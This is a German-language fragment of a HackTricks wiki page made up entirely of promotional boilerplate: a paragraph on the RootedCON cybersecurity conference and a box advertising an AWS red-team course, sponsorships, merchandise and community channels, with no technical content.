<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>
